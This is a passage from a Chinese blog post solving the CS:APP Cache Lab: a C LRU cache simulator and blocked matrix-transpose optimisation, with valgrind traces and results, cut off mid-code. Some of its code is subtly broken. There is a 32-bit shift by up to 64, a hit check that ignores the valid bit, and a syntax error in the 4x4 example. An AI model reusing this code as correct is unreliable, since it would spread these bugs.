<h2 id="init-Cache"><a href="#init-Cache" class="headerlink" title="init_Cache"></a>init_Cache</h2><p>接下来,开始给Cache分配空间,我们要使用lru策略,所以每一个cache的组成部分都要有valid_bits和tag和stamp(时间戳),三部分构成,考虑到其就像一个二维数组,故我们用一个结构体二维数组来模拟</p>
<p>先创建结构体,同时创建了一级指针和二级指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> valid_bits;</span><br><span class="line">    <span class="type">int</span> tag;</span><br><span class="line">    <span class="type">int</span> stamp;</span><br><span class="line">&#125; cache_line, *cache_f, **cache;</span><br><span class="line">cache cache_ = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>然后开始初始化结构体</p>
<p>先给一级指针开辟空间,再分别给每一个结构体开辟空间,以访问数组的方式初始化每个struct内的三个小玩意,便算是整个初始化完毕了.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init_cache</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    cache_ = (cache)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_f) * S);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cache_[i] = (cache_f)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line) * E);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cache_[i][j].valid_bits = <span class="number">0</span>;</span><br><span class="line">            cache_[i][j].tag = <span class="number">-1</span>;</span><br><span class="line">            cache_[i][j].stamp = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="simulate-cache"><a href="#simulate-cache" class="headerlink" title="simulate_cache"></a>simulate_cache</h2><p>模拟cache,首先检验我们得到的t路径能不能用,若fp是一个空指针,则该文件不存在,输出错误信息.然后就要通过while循环和fscanf函数来读取给定的trace文件夹中的指令</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023645.png" alt="image-20240312190510123"></p>
<p>显然,里面的指令都是一个operation+address+size,由给定的write up中说到,不用统计I这个指令,所以我们只用考虑Load,Store和Modify三个指令,Modify可以理解为L+S,所以我们通过fscanf得到指令选项后,’L’,’S’都只要更新一次,’M’要更新两次,同时每次读取文件的其中一行我们都要模拟缓存的LRU策略,更新时间戳.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">simulate_cache</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    fp = fopen(t, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fuck you Open error!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> operation;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> address;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%c %xu,%d\n&quot;</span>, &amp;operation, &amp;address, &amp;size) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (operation)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">            update(address);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">            update(address);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            update(address);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        update_stamp();</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="built_in">free</span>(cache_[i]);</span><br><span class="line">    <span class="built_in">free</span>(cache_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然在遍历完trace文件后,我们要记得关闭文件夹指针,同时挨个挨个释放malloc分配的空间.毕竟有借有还,再借不难!</p>
<h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p>这里我们这样模拟:对于传进来的地址,我们先要拆出他的set_index,拆出他的tag,Block Offset的位数由给定的-b参数决定,set_index由-s的参数决定,故我们通过进制位移得到如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> set_address = ((address &gt;&gt; b) &amp; ((<span class="number">-1U</span>) &gt;&gt; (<span class="number">64</span> - s)));</span><br><span class="line">  <span class="type">int</span> cache_tag = address &gt;&gt; (s + b);</span><br></pre></td></tr></table></figure>

<p>然后我们取到了这几个地址后就要分别判断是hit,还是miss,还是miss+eviction,所以我们要分别判断在对应的set里面,遍历一次.</p>
<ol>
<li>第一个循环判断的是能否hit</li>
<li>第二个循环判断的是是否有空行能够使用</li>
<li>第三个循环把使用时间最久的行驱逐换上新的行,复位时间戳.</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> address)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> set_address = ((address &gt;&gt; b) &amp; ((<span class="number">-1U</span>) &gt;&gt; (<span class="number">64</span> - s)));</span><br><span class="line">    <span class="type">int</span> cache_tag = address &gt;&gt; (s + b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_[set_address][i].tag == cache_tag)</span><br><span class="line">        &#123;</span><br><span class="line">            hit_count++;</span><br><span class="line">            cache_[set_address][i].stamp = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_[set_address][i].valid_bits == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            miss_count++;</span><br><span class="line">            cache_[set_address][i].valid_bits = <span class="number">1</span>;</span><br><span class="line">            cache_[set_address][i].stamp = <span class="number">0</span>;</span><br><span class="line">            cache_[set_address][i].tag = cache_tag;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> max_stamp = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> waste = <span class="number">-1</span>;</span><br><span class="line">    miss_count++;</span><br><span class="line">    eviction_count++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_[set_address][i].stamp &gt; max_stamp)</span><br><span class="line">        &#123;</span><br><span class="line">            max_stamp = cache_[set_address][i].stamp;</span><br><span class="line">            waste = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cache_[set_address][waste].stamp = <span class="number">0</span>;</span><br><span class="line">    cache_[set_address][waste].tag = cache_tag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="update-stamp"><a href="#update-stamp" class="headerlink" title="update_stamp"></a>update_stamp</h2><p>更新时间戳很简单,就是把合法情况全遍历一遍,时间戳都加一</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">update_stamp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">            <span class="keyword">if</span> (cache_[i][j].valid_bits == <span class="number">1</span>)</span><br><span class="line">                ++cache_[i][j].stamp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="总体代码"><a href="#总体代码" class="headerlink" title="总体代码:"></a>总体代码:</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> h, v, s, E, b, S;</span><br><span class="line"><span class="type">int</span> hit_count, miss_count, eviction_count;</span><br><span class="line"><span class="type">char</span> t[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> valid_bits;</span><br><span class="line">    <span class="type">int</span> tag;</span><br><span class="line">    <span class="type">int</span> stamp;</span><br><span class="line">&#125; cache_line, *cache_f, **cache;</span><br><span class="line">cache cache_ = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printUsage</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fuck you Vite ,Do it quickly ,Don&#x27;t play game! OK?\n&quot;</span></span><br><span class="line">           <span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;Options:\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -h         Print this help message.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -v         Optional verbose flag.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  -t &lt;file&gt;  Trace file.\n\n&quot;</span></span><br><span class="line">           <span class="string">&quot;Examples:\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span></span><br><span class="line">           <span class="string">&quot;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_cache</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    cache_ = (cache)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_f) * S);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cache_[i] = (cache_f)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line) * E);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cache_[i][j].valid_bits = <span class="number">0</span>;</span><br><span class="line">            cache_[i][j].tag = <span class="number">-1</span>;</span><br><span class="line">            cache_[i][j].stamp = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> address)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> set_address = ((address &gt;&gt; b) &amp; ((<span class="number">-1U</span>) &gt;&gt; (<span class="number">64</span> - s)));</span><br><span class="line">    <span class="type">int</span> cache_tag = address &gt;&gt; (s + b);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_[set_address][i].tag == cache_tag)</span><br><span class="line">        &#123;</span><br><span class="line">            hit_count++;</span><br><span class="line">            cache_[set_address][i].stamp = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_[set_address][i].valid_bits == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            miss_count++;</span><br><span class="line">            cache_[set_address][i].valid_bits = <span class="number">1</span>;</span><br><span class="line">            cache_[set_address][i].stamp = <span class="number">0</span>;</span><br><span class="line">            cache_[set_address][i].tag = cache_tag;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> max_stamp = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> waste = <span class="number">-1</span>;</span><br><span class="line">    miss_count++;</span><br><span class="line">    eviction_count++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache_[set_address][i].stamp &gt; max_stamp)</span><br><span class="line">        &#123;</span><br><span class="line">            max_stamp = cache_[set_address][i].stamp;</span><br><span class="line">            waste = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cache_[set_address][waste].stamp = <span class="number">0</span>;</span><br><span class="line">    cache_[set_address][waste].tag = cache_tag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">update_stamp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">            <span class="keyword">if</span> (cache_[i][j].valid_bits == <span class="number">1</span>)</span><br><span class="line">                ++cache_[i][j].stamp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">simulate_cache</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    fp = fopen(t, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fuck you Open error!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> operation;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> address;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%c %xu,%d\n&quot;</span>, &amp;operation, &amp;address, &amp;size) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (operation)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">            update(address);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">            update(address);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            update(address);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        update_stamp();</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="built_in">free</span>(cache_[i]);</span><br><span class="line">    <span class="built_in">free</span>(cache_);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sf</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> ** argv)</span>&#123;</span><br><span class="line">    h = <span class="number">0</span>;</span><br><span class="line">    v = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="comment">// 拆分输入的规定</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">-1</span> != (opt = (getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            h = <span class="number">1</span>;</span><br><span class="line">            printUsage();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            v = <span class="number">1</span>;</span><br><span class="line">            printUsage();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            s = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            E = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            b = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(t, optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            printUsage();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s &lt;= <span class="number">0</span> || E &lt;= <span class="number">0</span> || b &lt;= <span class="number">0</span> || t == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    S = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    sf (argc,argv);</span><br><span class="line">    init_cache();</span><br><span class="line">    simulate_cache();</span><br><span class="line">    printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Part-2-Block"><a href="#Part-2-Block" class="headerlink" title="Part_2 Block"></a>Part_2 Block</h1><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h3><p>给定的是s&#x3D;5,E&#x3D;1,b&#x3D;5;故S&#x3D;1&lt;&lt;s  &#x3D;&#x3D;&gt;  S&#x3D;32</p>
<p>故一共有32组set,每组1line,每line有32Bytes,由tran.c内的函数可知,矩阵中存的是int类型的数组 故每个cache_line能存8个int 变量</p>
<h3 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h3><blockquote>
<p>• Your code in trans.c must compile without warnings to receive credit.</p>
<p>• You are allowed to deﬁne at most 12 local variables of type int per transpose function.1 </p>
<p>• You are not allowed to side-step the previous rule by using any variables of type long or by using any bit tricks to store more than one value to a single variable.</p>
<p>• Your transpose function may not use recursion.</p>
<p>• If you choose to use helper functions, you may not have more than 12 local variables on the stack at a time between your helper functions and your top level transpose function. For example, if your transpose declares 8 variables, and then you call a function which uses 4 variables, which calls another function which uses 2, you will have 14 variables on the stack, and you will be in violation of the rule.</p>
<p>• Your transpose function may not modify array A. You may, however, do whatever you want with the contents of array B.</p>
<p>• You are NOT allowed to deﬁne any arrays in your code or to use any variant of malloc.</p>
</blockquote>
<h2 id="Eg-4-4"><a href="#Eg-4-4" class="headerlink" title="Eg:4*4"></a>Eg:4*4</h2><blockquote>
<p>因为题目条件,一个set只有一个line,一个line里面只有一个block,所以我们说的line和block在part_2里面几乎可以划为等价符号.</p>
</blockquote>
<p>以4*4分块为例子分析,以文章的限定条件,一个cache_line能存放8个int类型的数据,我们同样知道要是存到缓存中A的第一二行都会在同一个line里面而三四行在第二个line里面.</p>
<p>我们分别用朴素代码跑一遍</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023684.png" alt="image-20240312100228129"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># 朴素代码</span><br><span class="line"><span class="type">void</span> <span class="title function_">trans</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i, j, tmp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) &#123;</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们测试一下原始代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make &amp;&amp; ./test-trans -M 4 -N 4</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hits:15, misses:22, evictions:19</span><br></pre></td></tr></table></figure>

<p>重点分析原始代码,即自带的朴素转置造成多miss的原因</p>
<p>我们在终端输入以下命令来跟踪输出(命令能在文首的write up链接的pdf中看见,请仔细看!!!)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">./csim-ref -v -s <span class="number">5</span> -E <span class="number">1</span> -b <span class="number">5</span> -t <span class="title function_">f</span><span class="params">(i)</span> &gt; <span class="title function_">trace</span><span class="params">(i)</span>.txt<span class="comment">//f(i)为函数顺序输出的文件 fi要看你是第几个函数,会输出对应的fi(1,2,3,4...)的跟踪文件,然后用csim-ref模拟跑一遍</span></span><br></pre></td></tr></table></figure>

<p>这个是朴素代码的跟踪结果,我们观察分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S 18d0cc,1 miss </span><br><span class="line">L 18d100,8 miss </span><br><span class="line">L 18d0c4,4 hit </span><br><span class="line">L 18d0c0,4 hit   </span><br><span class="line">//Valgrind 模拟,函数,等等的系统性开支</span><br><span class="line">-------</span><br><span class="line">L 10d0c0,4 miss eviction  A数组访问A[0][0]，冷不命中，将块11装入cache</span><br><span class="line">S 14d0c0,4 miss eviction  虽然B[0][0]所映射的块11在cache中，但是标记位不同，造成冲突不命中，重新将数组B对应的块11装入cache</span><br><span class="line">L 10d0c4,4 miss eviction  A数组访问A[0][1]，虽然A[0][1] 所映射的块11在cache中，但是标记位不同，造成冲突不命中，重新将数组A对应的块11装入cache。</span><br><span class="line">S 14d0d0,4 miss eviction  虽然B[1][0]所映射的块11在cache中，但是标记位不同，造成冲突不命中，重新将数组B对应的块11装入cache</span><br><span class="line">L 10d0c8,4 miss eviction  虽然A[0][2]所映射的块11在cache中，但是标记位不同，造成冲突不命中，重新将数组A对应的块11装入cache。</span><br><span class="line"></span><br><span class="line">S 14d0e0,4 miss               B数组访问B[2][0]，B[2][0] 所映射的块12不在cache中，冷不命中，将数组B对应的块12装入cache</span><br><span class="line">L 10d0cc,4 hit                   A[0][3]所映射的块11在cache中，且标记位相同，故命中。</span><br><span class="line">S 14d0f0,4 hit                   Bhit</span><br><span class="line">L 10d0d0,4 hit                  A[1][0]所映射的块11在cache中，且标记位相同，故命中。</span><br><span class="line">S 14d0c4,4 miss eviction  虽然B[0][1] 所映射的块11在cache中，但是标记位不同，造成冲突不命中，重新将数组B对应的块11装入cache。</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>我们能发现,他之所以冲突就是因为在朴素代码中,由于A,B两个数组下标相同时,或者是因为其在缓存上的排列,当两个块在缓存中的映射位置相同时,例如A[0,0]已经加载到缓存中了,为了个B[0,0]赋值,只能把A[0,0]驱逐,但是写完B[0,0]后又要读入A[1,0],其映射的块又是在11(这个是由地址算出来的),所以B[0,0]又要被驱逐,重复很多次的冲突所以就会导致miss数量维持较高.</p>
<p>所以我们有什么办法呢?我们知道:<br>要先读入A数组再读入B数组,有没有办法能一次性读完A进入到缓存的部分呢?有的!,由上图我们知道A进入缓存的部分11块中有8个int,所以我们可以创建8个局部变量,把这8个int都存起来,然后再把b读进来,这样读过的A就不用再读了!就可以减少很多冲突!</p>
<p>代码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#优化代码</span><br><span class="line"><span class="type">void</span> <span class="title function_">trans_test</span><span class="params">(<span class="type">int</span> M,<span class="type">int</span> N,<span class="type">int</span> A[N][N],<span class="type">int</span> B[N][N])</span>&#123;</span><br><span class="line">    <span class="type">int</span> x1,x2,x3,x4,x5,x6,x7,x8,i;</span><br><span class="line"><span class="keyword">for</span>( i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">     x1=A[i][<span class="number">0</span>],x2=A[i][<span class="number">1</span>],x3=A[i][<span class="number">2</span>], x4=A[i][<span class="number">3</span>],x5=A[i+<span class="number">1</span>][<span class="number">0</span>],x6=A[i+<span class="number">1</span>][<span class="number">1</span>],x7=A[i+<span class="number">1</span>][<span class="number">2</span>], x8=A[i+<span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">     B[<span class="number">0</span>][i]=x1;,B[<span class="number">1</span>][i]=x2,B[<span class="number">2</span>][i]=x3, B[<span class="number">3</span>][i]=x4,B[<span class="number">0</span>][i+<span class="number">1</span>]=x5,B[<span class="number">1</span>][i+<span class="number">1</span>]=x6,B[<span class="number">2</span>][i+<span class="number">1</span>]=x7,B[<span class="number">3</span>][i+<span class="number">1</span>]=x8;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试结果如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hits:29, misses:8, evictions:5</span><br></pre></td></tr></table></figure>

<p>miss数大量减少,所以要是可以理解的话,我们就继续往下看趴!</p>
<h2 id="Phase-1-32-32"><a href="#Phase-1-32-32" class="headerlink" title="Phase_1:32*32"></a>Phase_1:32*32</h2><h3 id="通关思路"><a href="#通关思路" class="headerlink" title="通关思路"></a>通关思路</h3><p>依据ppt的内容,我们往分块方向上去讨论,8*8分块,因为一个cache_line只能存8个int,所以我们使用8*8的分块形式能恰好利用到前八行由下面的图可以看出,除却对角线上的元素,对应色块的转置采用8*8几乎是互不干扰的,因为其映射的地址不一样,所以我们将cache划分成从上往下共四份是有用的.所以我们在每个分块里单独进行转置,能减少很多次因为冲突而导致的Miss.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> trans_1_desc[]=<span class="string">&quot;直接进行8*8的分块,不做任何优化&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">trans_1</span><span class="params">(<span class="type">int</span> M,<span class="type">int</span> N,<span class="type">int</span> A[N][N],<span class="type">int</span> B[N][N])</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(M==<span class="number">32</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;M;i+=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;N;j+=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> m=i;m&lt;<span class="number">8</span>+i;m++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> n=j;n&lt;<span class="number">8</span>+j;n++)</span><br><span class="line">        B[n][m]=A[m][n];</span><br><span 